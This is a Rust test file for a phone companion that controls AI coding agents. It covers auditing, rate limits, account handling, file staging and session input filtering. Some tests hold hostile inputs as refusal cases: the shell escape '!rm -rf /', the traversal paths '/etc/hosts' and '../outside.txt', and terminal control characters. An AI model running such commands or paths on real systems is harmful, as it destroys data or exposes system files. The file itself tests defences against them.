    let call = |m: &'static str, params: Value| dispatch(&c, &me, m, params);
    assert!(call("agents.usage.setMode", json!({ "mode": "turbo" }))
        .await
        .is_err());
    assert!(call("agents.spare.add", json!({ "text": "  " }))
        .await
        .is_err());
    assert!(call("agents.spare.add", json!({ "text": "x".repeat(601) }))
        .await
        .is_err());
    assert!(stub.usage_changes.lock().unwrap().is_empty());
    let inv = call("agents.usage.setMode", json!({ "mode": "use_it_all" }))
        .await
        .unwrap();
    assert!(inv.get("accounts").is_some(), "answers the inventory");
    call(
        "agents.spare.add",
        json!({ "text": "Tidy the docs", "agentId": "a1" }),
    )
    .await
    .unwrap();
    let said = call("agents.spare.spendNow", json!({})).await.unwrap();
    assert!(said["line"]
        .as_str()
        .unwrap()
        .contains("ideas for leftover usage"));
    assert_eq!(
        *stub.usage_changes.lock().unwrap(),
        vec!["mode use_it_all", "add Tidy the docs for a1", "spend"]
    );
    for m in [
        "agents.usage.setMode",
        "agents.spare.add",
        "agents.spare.spendNow",
    ] {
        assert!(!READ_ONLY_METHODS.contains(&m), "{m}");
    }
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|(_, m, d, ok)| m == "agents.usage.setMode" && *ok && d == "usage mode: use_it_all"));
    assert!(audited
        .iter()
        .any(|(_, m, _, ok)| m == "agents.spare.spendNow" && *ok));
}

#[tokio::test]
async fn a_phone_swaps_and_reorders_accounts_audited_and_never_sees_a_token() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let swap = |params: Value| dispatch(&c, &me, "agents.accounts.use", params);
    assert!(swap(json!({})).await.is_err());
    assert!(swap(json!({ "engine": "gemini", "id": "a1" }))
        .await
        .is_err());
    assert!(swap(json!({ "engine": "claude", "id": "" })).await.is_err());
    let order = |params: Value| dispatch(&c, &me, "agents.accounts.reorder", params);
    assert!(order(json!({ "engine": "claude", "ids": [] }))
        .await
        .is_err());
    assert!(order(json!({ "engine": "claude", "ids": [1, 2] }))
        .await
        .is_err());
    assert!(stub.account_orders.lock().unwrap().is_empty());

    let accounts = swap(json!({ "engine": "claude", "id": "a1work" }))
        .await
        .unwrap();
    // The accounts as the phone lists them: names, never a token.
    let text = accounts.to_string();
    assert!(accounts.as_array().is_some_and(|a| !a.is_empty()));
    assert!(!text.to_lowercase().contains("token"));
    order(json!({ "engine": "claude", "ids": ["a1work", "default"] }))
        .await
        .unwrap();
    assert_eq!(
        *stub.account_orders.lock().unwrap(),
        vec![
            ("claude".to_string(), vec!["a1work".to_string()]),
            (
                "claude".to_string(),
                vec!["a1work".to_string(), "default".to_string()]
            ),
        ]
    );
    assert!(!READ_ONLY_METHODS.contains(&"agents.accounts.use"));
    assert!(!READ_ONLY_METHODS.contains(&"agents.accounts.reorder"));
    let audited = stub.audited();
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.accounts.use"
            && *ok
            && detail == "use claude account a1work first"));
    assert!(audited
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.accounts.reorder"
            && *ok
            && detail == "claude accounts in order: a1work, default"));
}

#[tokio::test]
async fn a_phone_sets_one_agents_level_audited() {
    use crate::agents::independence::Level;
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    // The overview says which agents have their own level.
    let overview = dispatch(&c, &me, "agents.overview", json!({}))
        .await
        .unwrap();
    assert_eq!(overview["agents"][0]["independence"], "full_send");
    let set = |params: Value| dispatch(&c, &me, "agents.setAgentIndependence", params);
    assert!(set(json!({})).await.is_err());
    assert!(set(json!({ "level": "often" })).await.is_err());
    assert!(set(json!({ "agentId": "a1", "level": "yolo" }))
        .await
        .is_err());
    assert!(stub.agent_levels.lock().unwrap().is_empty());
    let answer = set(json!({ "agentId": "a1", "level": "often" }))
        .await
        .unwrap();
    assert_eq!(answer["level"], "often");
    let answer = set(json!({ "agentId": "a1", "level": "team" }))
        .await
        .unwrap();
    assert!(answer["level"].is_null());
    assert_eq!(
        *stub.agent_levels.lock().unwrap(),
        vec![
            ("a1".to_string(), Some(Level::Often)),
            ("a1".to_string(), None)
        ]
    );
    // Not the team's: that's `agents.setIndependence`.
    assert!(stub.independence.lock().unwrap().is_empty());
    assert!(!READ_ONLY_METHODS.contains(&"agents.setAgentIndependence"));
    assert!(stub
        .audited()
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setAgentIndependence"
            && *ok
            && detail == "a1 independence: often"));
}

#[tokio::test]
async fn a_phone_switches_admin_on_and_off_audited() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let set = |params: Value| dispatch(&c, &me, "agents.setAdmin", params);
    assert!(set(json!({})).await.is_err());
    assert!(set(json!({ "agentId": "a1" })).await.is_err());
    assert!(set(json!({ "agentId": "a1", "admin": "yes" }))
        .await
        .is_err());
    let answer = set(json!({ "agentId": "a1", "admin": true }))
        .await
        .unwrap();
    assert_eq!(answer["admin"], true);
    assert_eq!(*stub.admins.lock().unwrap(), vec![("a1".to_string(), true)]);
    assert!(!READ_ONLY_METHODS.contains(&"agents.setAdmin"));
    assert!(stub
        .audited()
        .iter()
        .any(|(_, m, detail, ok)| m == "agents.setAdmin" && *ok && detail == "a1 admin on"));
}

#[tokio::test]
async fn a_phone_can_start_from_a_ready_made_agent() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    // What the sheet offers: every template, without its briefing.
    let list = dispatch(&c, &me, "agents.templates", json!({}))
        .await
        .unwrap();
    let list = list.as_array().unwrap();
    assert_eq!(list.len(), crate::agents::templates::all().len());
    assert!(list.iter().all(|t| t.get("instructions").is_none()));
    assert!(list
        .iter()
        .any(|t| t["id"] == "inbox" && t["needs"] == "mail"));
    assert!(READ_ONLY_METHODS.contains(&"agents.templates"));
    // An unknown one is refused before the desk sees it.
    let refused = dispatch(
        &c,
        &me,
        "agents.create",
        json!({ "input": { "name": "Ops", "template": "astrologer" } }),
    )
    .await
    .unwrap_err();
    assert!(refused
        .summary()
        .contains("isn't one of the ready-made agents"));
    assert!(stub.created.lock().unwrap().is_empty());
    dispatch(
            &c,
            &me,
            "agents.create",
            json!({ "input": { "name": "Research", "role": "Looks things up", "template": " research " } }),
        )
        .await
        .unwrap();
    assert_eq!(
        stub.created.lock().unwrap()[0].template.as_deref(),
        Some("research")
    );
}

#[tokio::test]
async fn a_phone_makes_at_most_ten_agents_a_minute() {
    use crate::companion::testkit::Stub;
    use crate::companion::MAX_AGENTS_CREATED_PER_MINUTE;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    for i in 0..MAX_AGENTS_CREATED_PER_MINUTE {
        let params = json!({ "input": { "name": format!("A{i}") }, "clientId": format!("c{i}") });
        dispatch(&c, &me, "agents.create", params).await.unwrap();
    }
    // A retry of one already made is the cache's answer, not an eleventh.
    let retry = json!({ "input": { "name": "A0" }, "clientId": "c0" });
    assert!(dispatch(&c, &me, "agents.create", retry).await.is_ok());
    let refused = dispatch(
        &c,
        &me,
        "agents.create",
        json!({ "input": { "name": "One more" } }),
    )
    .await
    .unwrap_err();
    assert!(
        refused.summary().contains("in a minute"),
        "{}",
        refused.summary()
    );
    assert!(matches!(
        refused,
        WireError::Protocol {
            code: ProtocolCode::RateLimited,
            ..
        }
    ));
    assert_eq!(
        stub.created.lock().unwrap().len(),
        MAX_AGENTS_CREATED_PER_MINUTE
    );
    // Another phone has its own minute, and the window rolls.
    let other = caller("dev_b");
    assert!(dispatch(
        &c,
        &other,
        "agents.create",
        json!({ "input": { "name": "B" } })
    )
    .await
    .is_ok());
    assert!(c.allow_create("dev_a", now_ms() + 60_000));
}

#[test]
fn a_new_agent_starts_on_the_first_colour_nobody_wears() {
    let taken = |c: &[&str]| c.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    assert_eq!(super::free_color(&[]), "brown");
    assert_eq!(
        super::free_color(&taken(&["white", "brown", "red"])),
        "orange"
    );
    let all: Vec<String> = crate::agents::store::COLORS
        .iter()
        .map(|s| s.to_string())
        .collect();
    assert_eq!(super::free_color(&all), "purple");
}

#[tokio::test]
async fn a_session_question_is_answered_by_option() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let params = json!({ "agentId": AGENT, "requestId": "q6", "allow": true, "choice": 1 });
    dispatch(&c, &me, "agents.answerApproval", params)
        .await
        .unwrap();
    assert_eq!(stub.answers.lock().unwrap()[0].choice, Some(1));
    assert_eq!(stub.audited()[0].2, "picked option 2");
}

#[tokio::test]
async fn memory_changes_are_audited_and_kept_short() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let add = |text: String| json!({ "agentId": AGENT, "change": { "op": "add", "text": text } });
    let view = dispatch(
        &c,
        &me,
        "agents.memoryChange",
        add("Ship on Fridays".into()),
    )
    .await
    .unwrap();
    assert_eq!(view["entries"].as_array().unwrap().len(), 4);
    assert_eq!(stub.audited()[0].2, "remember: Ship on Fridays");
    assert!(
        dispatch(&c, &me, "agents.memoryChange", add("x".repeat(2_001)))
            .await
            .is_err()
    );
    assert!(
        dispatch(&c, &me, "agents.memoryChange", add("a\u{1b}[2J".into()))
            .await
            .is_err()
    );
    // Reading isn't an action: not audited.
    dispatch(&c, &me, "agents.memory", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert_eq!(stub.audited().len(), 3);
}

#[tokio::test]
async fn a_send_echoes_its_client_id_and_a_retry_returns_the_same_message() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let (mut rx, _) = c.hub.resume(None);
    let me = caller("dev_a");
    let params = json!({ "agentId": AGENT, "text": "hello", "clientId": "c-42" });
    let first = dispatch(&c, &me, "agents.send", params.clone())
        .await
        .unwrap();
    assert_eq!(first["clientId"], "c-42");
    let again = dispatch(&c, &me, "agents.send", params).await.unwrap();
    assert_eq!(first, again);
    assert_eq!(stub.sends.load(std::sync::atomic::Ordering::SeqCst), 1);
    let mut journaled = None;
    while let Ok(item) = rx.try_recv() {
        if let super::super::hub::HubItem::Journaled {
            event: super::super::wire::Event::Message { message },
            ..
        } = item
        {
            if message["id"] == first["id"] {
                journaled = Some(message);
            }
        }
    }
    assert_eq!(journaled.expect("journaled")["clientId"], "c-42");
}

#[tokio::test]
async fn attachments_must_be_this_devices_staged_blobs_and_few_enough() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, _) = Stub::companion();
    let me = caller("dev_a");
    let send = |ids: Vec<String>, client: &str| {
        let attachments: Vec<Value> = ids.iter().map(|id| json!({ "blobId": id })).collect();
        json!({ "agentId": AGENT, "text": "", "clientId": client, "attachments": attachments })
    };
    let unknown = dispatch(&c, &me, "agents.send", send(vec!["blob_nope".into()], "c1")).await;
    assert!(unknown.unwrap_err().summary().contains("Attach it again"));

    let theirs = c.blobs.put("dev_b", "a.txt", None, b"x", now_ms()).unwrap();
    assert!(
        dispatch(&c, &me, "agents.send", send(vec![theirs.id], "c2"))
            .await
            .is_err()
    );

    let eleven: Vec<String> = (0..11)
        .map(|_| {
            c.blobs
                .put("dev_a", "a.txt", None, b"x", now_ms())
                .unwrap()
                .id
        })
        .collect();
    let refused = dispatch(&c, &me, "agents.send", send(eleven, "c3")).await;
    assert!(refused.unwrap_err().summary().contains("up to 10 files"));

    // No files and no text is still refused.
    let empty = dispatch(&c, &me, "agents.send", send(Vec::new(), "c4")).await;
    assert!(empty.is_err());
}

#[tokio::test]
async fn fetch_path_stages_a_file_for_this_device_and_refuses_folders() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    std::fs::write(stub.home.path().join("report.md"), "# Q3").unwrap();
    std::fs::create_dir(stub.home.path().join("folder")).unwrap();
    let me = caller("dev_a");
    let blob = dispatch(
        &c,
        &me,
        "agents.fetchPath",
        json!({ "agentId": AGENT, "path": "report.md" }),
    )
    .await
    .unwrap();
    assert_eq!(blob["name"], "report.md");
    assert_eq!(blob["mime"], "text/markdown");
    assert_eq!(blob["size"], 4);
    let id = blob["blobId"].as_str().unwrap();
    assert!(c.blobs.get("dev_a", id, now_ms()).is_some());
    assert!(c.blobs.get("dev_b", id, now_ms()).is_none());
    for refused in ["folder", "/etc/hosts", "../outside.txt"] {
        assert!(
            dispatch(
                &c,
                &me,
                "agents.fetchPath",
                json!({ "agentId": AGENT, "path": refused })
            )
            .await
            .is_err(),
            "{refused}"
        );
    }
}

#[tokio::test]
async fn schedule_methods_need_an_id_except_create() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, _) = Stub::companion();
    let me = caller("dev_a");
    let missing = dispatch(
        &c,
        &me,
        "agents.schedule.cancel",
        json!({ "agentId": AGENT }),
    )
    .await;
    assert!(missing.is_err());
    let made = dispatch(
        &c,
        &me,
        "agents.schedule.create",
        json!({ "agentId": AGENT, "when": "every weekday at 9am", "note": "Check the invoices" }),
    )
    .await
    .unwrap();
    assert_eq!(made["note"], "Check the invoices");
    assert_eq!(made["repeat"]["kind"], "days");
}

#[tokio::test]
async fn the_agent_sheet_reads_usage_and_instructions_and_revokes() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let brief = dispatch(&c, &me, "agents.instructions", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert!(brief.as_str().unwrap().contains("invoices"));
    let usage = dispatch(&c, &me, "agents.usage", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert_eq!(usage["week"]["turns"], 3);
    dispatch(
        &c,
        &me,
        "agents.revokePermission",
        json!({ "agentId": AGENT, "ruleId": "r1" }),
    )
    .await
    .unwrap();
    assert_eq!(stub.revoked.lock().unwrap().as_slice(), ["r1"]);
    let diff = dispatch(
        &c,
        &me,
        "agents.changeDiff",
        json!({ "agentId": AGENT, "messageId": "m-change", "path": "src/a.ts" }),
    )
    .await
    .unwrap();
    assert_eq!(diff["filePath"], "src/a.ts");
    // Reads aren't audited; the revoke is.
    let audit = stub.audited();
    assert_eq!(audit.len(), 1);
    assert_eq!(audit[0].1, "agents.revokePermission");
}

/// "What it does on its own": reading is unaudited, taking away is
/// audited, and nothing but a known narrow reaches the desk.
#[tokio::test]
async fn on_its_own_reads_and_only_narrows() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let view = dispatch(&c, &me, "agents.onItsOwn", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert_eq!(view["level"], "full_send");
    let team = dispatch(&c, &me, "agents.onItsOwnTeam", json!({}))
        .await
        .unwrap();
    assert_eq!(team["agents"][0]["agentId"], AGENT);
    for give in [
        json!({ "kind": "browser_on" }),
        json!({ "kind": "admin_on" }),
        json!({ "kind": "level", "level": "full_send" }),
        json!("browser"),
    ] {
        assert!(dispatch(
            &c,
            &me,
            "agents.onItsOwnNarrow",
            json!({ "agentId": AGENT, "narrow": give }),
        )
        .await
        .is_err());
    }
    assert!(stub.narrowed.lock().unwrap().is_empty());
    dispatch(
        &c,
        &me,
        "agents.onItsOwnNarrow",
        json!({ "agentId": AGENT, "narrow": { "kind": "rule", "ruleId": "r1" } }),
    )
    .await
    .unwrap();
    assert_eq!(stub.narrowed.lock().unwrap().len(), 1);
    // Reads aren't audited; each attempt to take away is, refused or not.
    let audit = stub.audited();
    assert_eq!(audit.len(), 5);
    assert!(audit.iter().all(|a| a.1 == "agents.onItsOwnNarrow"));
    assert!(audit[4].2.starts_with("take back rule"), "{:?}", audit[4]);
}

#[tokio::test]
async fn keeping_and_discarding_a_copy_name_the_copy_and_are_audited() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let kept = dispatch(
        &c,
        &me,
        "agents.keepCopy",
        json!({ "agentId": AGENT, "copyId": "copy-1" }),
    )
    .await
    .unwrap();
    assert_eq!(kept["outcome"], "kept");
    assert_eq!(kept["files"], 2);
    // Keeping into another branch names it: the confirmation travels.
    let into = dispatch(
        &c,
        &me,
        "agents.keepCopy",
        json!({ "agentId": AGENT, "copyId": "copy-1", "into": "feature" }),
    )
    .await
    .unwrap();
    assert_eq!(into["branch"], "feature");
    dispatch(
        &c,
        &me,
        "agents.discardCopy",
        json!({ "agentId": AGENT, "copyId": "copy-1" }),
    )
    .await
    .unwrap();
    // A card for a copy that's gone is refused, not applied to a newer one.
    assert!(dispatch(
        &c,
        &me,
        "agents.keepCopy",
        json!({ "agentId": AGENT, "copyId": "old" }),
    )
    .await
    .is_err());
    // The copy is named: a bare agent id is not enough.
    assert!(
        dispatch(&c, &me, "agents.discardCopy", json!({ "agentId": AGENT }))
            .await
            .is_err()
    );
    assert_eq!(
        *stub.copies.lock().unwrap(),
        vec![
            "keep copy-1".to_string(),
            "keep copy-1 into feature".to_string(),
            "discard copy-1".to_string()
        ]
    );
    let audit = stub.audited();
    assert!(audit.iter().any(|a| a.1 == "agents.keepCopy"));
    assert!(audit.iter().any(|a| a.1 == "agents.discardCopy"));
}

#[tokio::test]
async fn watch_live_hands_a_one_time_tailnet_link_and_is_audited() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    assert!(METHODS.contains(&"agents.watchLive"));
    assert!(!READ_ONLY_METHODS.contains(&"agents.watchLive"));
    let link = dispatch(
        &c,
        &me,
        "agents.watchLive",
        json!({ "agentId": AGENT, "messageId": "m-result" }),
    )
    .await
    .unwrap();
    let url = link["url"].as_str().unwrap();
    let prefix = format!(
        "https://mac.example.ts.net:{}{}",
        super::super::watch::WATCH_TAILNET_PORT,
        super::super::watch::ticket_prefix()
    );
    assert!(url.starts_with(&prefix), "{url}");
    assert!(link["expiresAt"].as_u64().unwrap() > 0);
    // Nothing running for that card: an honest refusal, no link.
    let refused = dispatch(
        &c,
        &me,
        "agents.watchLive",
        json!({ "agentId": AGENT, "messageId": "m-not-running" }),
    )
    .await
    .unwrap_err();
    assert!(format!("{refused:?}").contains("Open Preview on the Mac first"));
    assert!(stub.audited().iter().any(|a| a.1 == "agents.watchLive"));
}

#[tokio::test]
async fn a_session_starts_once_per_client_id_with_remote_access_refusals() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let project = "/Users/julian/ShipStudio/site";
    let start = |prompt: &str, client: &str| json!({ "project": project, "prompt": prompt, "clientId": client });
    let first = dispatch(&c, &me, "sessions.start", start("add a footer", "a1"))
        .await
        .unwrap();
    assert_eq!(first["sessionId"], "pty-new");
    dispatch(&c, &me, "sessions.start", start("add a footer", "a1"))
        .await
        .unwrap();
    assert_eq!(stub.typed.lock().unwrap().len(), 1);
    assert!(
        dispatch(&c, &me, "sessions.start", start("!rm -rf /", "a3"))
            .await
            .is_err()
    );
}

#[tokio::test]
async fn a_preview_screenshot_is_a_private_blob() {
    use crate::companion::testkit::Stub;
    let (c, _) = Stub::companion();
    let me = caller("dev_a");
    let blob = dispatch(
        &c,
        &me,
        "preview.screenshot",
        json!({ "project": "/Users/julian/ShipStudio/site", "device": "phone" }),
    )
    .await
    .unwrap();
    assert_eq!(blob["name"], "site-phone.jpg");
    assert_eq!(blob["mime"], "image/jpeg");
    let id = blob["blobId"].as_str().unwrap();
    assert!(c.blobs.get("dev_a", id, now_ms()).is_some());
    assert!(c.blobs.get("dev_b", id, now_ms()).is_none());
    assert!(dispatch(
        &c,
        &me,
        "preview.screenshot",
        json!({ "project": "/x", "device": "watch" }),
    )
    .await
    .is_err());
}

#[tokio::test]
async fn the_phone_may_only_pin_mute_and_hide() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let done = dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "muted": true, "pinned": false } }),
    )
    .await
    .unwrap();
    assert_eq!(done["muted"], true);
    assert_eq!(done["pinned"], false);
    for refused in [
        json!({ "agentId": AGENT, "input": { "name": "Evil" } }),
        json!({ "agentId": AGENT, "input": { "project": "/Users/you/ShipStudio/site" } }),
        json!({ "agentId": AGENT, "input": { "instructions": "x".repeat(MAX_INSTRUCTIONS + 1) } }),
        json!({ "agentId": AGENT, "input": {} }),
    ] {
        assert!(dispatch(&c, &me, "agents.update", refused).await.is_err());
    }
    // The instructions can be corrected from the agent sheet, and the audit says so.
    dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "instructions": "Check the invoices" } }),
    )
    .await
    .unwrap();
    assert_eq!(stub.toggles.lock().unwrap().len(), 2);
    let audit = stub.audited();
    assert_eq!(audit[0].2, format!("unpin mute {AGENT}"));
    assert_eq!(
        audit.last().unwrap().2,
        format!("edit instructions (18 chars) {AGENT}")
    );
}

#[tokio::test]
async fn an_older_phone_sending_a_look_is_accepted_and_the_look_ignored() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let look = json!({ "shape": "hexagon", "face": "smile", "finish": "embossed" });
    // Its look sheet: a colour and the shape it previewed.
    let done = dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "avatar": look, "color": "teal" } }),
    )
    .await
    .unwrap();
    assert!(done.get("avatar").is_none(), "agents carry no look");
    let sent = stub.toggles.lock().unwrap().last().cloned().unwrap();
    assert_eq!(sent.1.color.as_deref(), Some("teal"));
    // A look alone, even one with keys no build ever drew: no error, nothing to it.
    dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "avatar": { "shape": "blob", "face": "?" } } }),
    )
    .await
    .unwrap();
    // Creating with one: made as asked, the look dropped.
    let made = dispatch(
            &c,
            &me,
            "agents.create",
            json!({ "input": { "name": "Inbox", "color": "teal", "avatar": look }, "clientId": "old-1" }),
        )
        .await
        .unwrap();
    assert_eq!(made["name"], "Inbox");
    assert!(made.get("avatar").is_none());
    let created = stub.created.lock().unwrap().last().cloned().unwrap();
    assert!(created.old_look.is_none(), "never passed on");
}

#[tokio::test]
async fn the_phone_can_switch_an_agents_engine_and_model() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "engine": "codex", "model": "gpt-5-codex" } }),
    )
    .await
    .unwrap();
    let sent = stub.toggles.lock().unwrap();
    assert_eq!(sent.len(), 1);
    assert_eq!(sent[0].1.engine.as_deref(), Some("codex"));
    assert_eq!(sent[0].1.model.as_deref(), Some("gpt-5-codex"));
    drop(sent);
    assert_eq!(
        stub.audited().last().unwrap().2,
        format!("engine codex model gpt-5-codex {AGENT}")
    );
}

#[tokio::test]
async fn the_phone_can_set_an_agents_effort() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    dispatch(
        &c,
        &me,
        "agents.update",
        json!({ "agentId": AGENT, "input": { "effort": "high" } }),
    )
    .await
    .unwrap();
    let sent = stub.toggles.lock().unwrap();
    assert_eq!(sent[0].1.effort.as_deref(), Some("high"));
    drop(sent);
    assert_eq!(
        stub.audited().last().unwrap().2,
        format!("effort high {AGENT}")
    );
    assert!(super::super::wire::MAC_FEATURES.contains(&"agents.effort"));
}

#[tokio::test]
async fn the_phone_can_start_an_agent_fresh() {
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let done = dispatch(&c, &me, "agents.startFresh", json!({ "agentId": AGENT }))
        .await
        .unwrap();
    assert_eq!(done["sessionId"], Value::Null);
    assert!(done.get("context").is_none());
    assert_eq!(*stub.fresh.lock().unwrap(), vec![AGENT.to_string()]);
    assert!(stub.audited().iter().any(|a| a.1 == "agents.startFresh"));
    assert!(
        dispatch(&c, &me, "agents.startFresh", json!({ "agentId": "nobody" }))
            .await
            .is_err()
    );
}

#[tokio::test]
async fn session_input_gets_remote_access_refusals_and_is_sent_once() {
    use crate::companion::testkit::Stub;
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let project = "/Users/julian/ShipStudio/site";
    let send = |text: &str, client: &str, tab: &str| json!({ "project": project, "sessionId": tab, "text": text, "clientId": client });
    // The working tab takes a message, once per clientId.
    let first = dispatch(&c, &me, "sessions.send", send("fix it", "s1", "pty-1"))
        .await
        .unwrap();
    assert_eq!(first["sessionId"], "pty-1");
    dispatch(&c, &me, "sessions.send", send("fix it", "s1", "pty-1"))
        .await
        .unwrap();
    assert_eq!(stub.typed.lock().unwrap().len(), 1);
    // Shell escapes, control characters and unknown slash commands never reach a tab.
    for text in ["!rm -rf /", "\u{7}\u{8}", "/logout"] {
        let refused = dispatch(&c, &me, "sessions.send", send(text, text, "pty-1")).await;
        assert!(refused.is_err(), "{text}");
    }
    // A tab showing a question isn't typed into: Enter would answer it.
    let asking = dispatch(&c, &me, "sessions.send", send("hello", "s2", "pty-2")).await;
    assert!(asking
        .unwrap_err()
        .summary()
        .contains("waiting for your answer"));
    // Keys: only ones Remote Access can press, a digit only while asking.
    let key = |k: &str, tab: &str| json!({ "sessionId": tab, "key": k });
    dispatch(&c, &me, "sessions.key", key("1", "pty-2"))
        .await
        .unwrap();
    assert!(dispatch(&c, &me, "sessions.key", key("1", "pty-1"))
        .await
        .is_err());
    assert!(dispatch(&c, &me, "sessions.key", key("rm", "pty-2"))
        .await
        .is_err());
    assert_eq!(stub.typed.lock().unwrap().len(), 2);
}

#[tokio::test]
async fn setting_up_the_team_reaches_the_desk_and_only_reading_it_goes_unaudited() {
    use crate::agents::team_setup::{StepId, StepState};
    use crate::companion::testkit::{Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let view = dispatch(&c, &me, "agents.teamSetup", Value::Null)
        .await
        .unwrap();
    assert_eq!(view["steps"][0]["id"], "logins");
    dispatch(&c, &me, "agents.teamSetup", json!({ "any": true }))
        .await
        .unwrap();
    dispatch(
        &c,
        &me,
        "agents.teamSetup.step",
        json!({ "step": "routines", "state": "skipped" }),
    )
    .await
    .unwrap();
    assert!(dispatch(
        &c,
        &me,
        "agents.teamSetup.step",
        json!({ "step": "everything", "state": "done" })
    )
    .await
    .is_err());
    dispatch(
        &c,
        &me,
        "agents.teamSetup.routine",
        json!({ "agentId": "a2", "checkInId": "c1", "on": true }),
    )
    .await
    .unwrap();
    let sent = dispatch(
        &c,
        &me,
        "agents.teamSetup.hello",
        json!({ "agentId": AGENT }),
    )
    .await
    .unwrap();
    assert!(sent.get("id").is_some());
    dispatch(&c, &me, "agents.teamSetup.missing", json!({}))
        .await
        .unwrap();
    dispatch(&c, &me, "agents.teamSetup.dismiss", json!({}))
        .await
        .unwrap();
    assert_eq!(
        *stub.team_setup.lock().unwrap(),
        vec![
            TeamSetupAction::Get { any: false },
            TeamSetupAction::Get { any: true },
            TeamSetupAction::Step {
                step: StepId::Routines,
                state: StepState::Skipped
            },
            TeamSetupAction::Routine {
                agent_id: "a2".into(),
                check_in_id: "c1".into(),
                on: true
            },
            TeamSetupAction::Hello {
                agent_id: AGENT.into()
            },
            TeamSetupAction::Missing,
            TeamSetupAction::Dismiss,
        ]
    );
    let audited: Vec<String> = stub
        .audited()
        .into_iter()
        .map(|(_, m, d, _)| format!("{m}: {d}"))
        .collect();
    assert!(!audited.iter().any(|l| l.starts_with("agents.teamSetup:")));
    assert!(audited
        .iter()
        .any(|l| l == "agents.teamSetup.routine: setup: switch on c1 a2"));
    assert!(audited
        .iter()
        .any(|l| l.starts_with("agents.teamSetup.hello: setup: said hi to")));
}

#[test]
fn every_read_only_method_is_served() {
    for m in READ_ONLY_METHODS {
        assert!(METHODS.contains(m), "{m}");
    }
}

#[tokio::test]
async fn a_send_cache_runs_each_client_id_once() {
    let cache = SendCache::default();
    let runs = std::sync::atomic::AtomicUsize::new(0);
    let send = || async {
        runs.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        Ok(json!({ "id": "m1" }))
    };
    let a = cache.once("dev:c1".into(), 0, send).await.unwrap();
    let b = cache.once("dev:c1".into(), 1, send).await.unwrap();
    assert_eq!(a, b);
    assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 1);
    cache.once("dev:c2".into(), 2, send).await.unwrap();
    assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 2);
    // A day later the id is forgotten.
    cache
        .once("dev:c1".into(), SEND_MEMORY_MS + 5, send)
        .await
        .unwrap();
    assert_eq!(runs.load(std::sync::atomic::Ordering::SeqCst), 3);
}

#[tokio::test]
async fn a_failed_send_can_be_retried() {
    let cache = SendCache::default();
    let failed = cache
        .once("k".into(), 0, || async {
            Err(WireError::Command(CommandError::expected("disk full")))
        })
        .await;
    assert!(failed.is_err());
    let ok = cache.once("k".into(), 1, || async { Ok(json!(1)) }).await;
    assert_eq!(ok.unwrap(), json!(1));
}

#[tokio::test]
async fn a_dictation_is_written_out_again_and_its_audio_is_gone_after() {
    use crate::companion::testkit::{dictation_wav, Stub, AGENT};
    let (c, stub) = Stub::companion();
    let me = caller("dev_a");
    let blob = c
        .blobs
        .put(
            "dev_a",
            "Dictation.wav",
            Some("audio/wav"),
            &dictation_wav(1.0),
            now_ms(),
        )
        .unwrap();
    let path = blob.path.clone();
    let said = dispatch(
        &c,
        &me,
        "dictation.transcribe",
        json!({ "blob": blob.id, "agentId": AGENT }),
    )
    .await
    .unwrap();
    assert_eq!(said["text"], "Ask Priya to send the Acme invoice today.");
    assert_eq!(said["tidied"], true);
    assert!(said.get("preparing").is_none());
    // 16 kHz mono in, the agent named; the audio never kept.
    assert_eq!(
        stub.transcribed.lock().unwrap().as_slice(),
        &[(16_000, Some(AGENT.to_string()), None)]
    );
